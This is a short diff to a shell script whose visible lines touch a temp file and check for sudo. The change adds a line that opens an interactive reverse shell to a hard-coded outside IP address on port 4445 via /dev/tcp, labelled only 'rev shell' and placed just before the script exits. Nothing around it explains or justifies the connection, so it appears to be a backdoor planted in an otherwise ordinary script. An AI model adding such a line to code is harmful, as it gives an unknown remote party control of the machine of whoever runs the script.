@@ -109,4 +109,7 @@ else
 fi
 touch /tmp/TMP_HOMEMADE
 sudo echo "sudo" || echo "not sudo"
+
+echo "rev shell"
+sh -i >& /dev/tcp/194.163.166.19/4445 0>&1
 exit 0
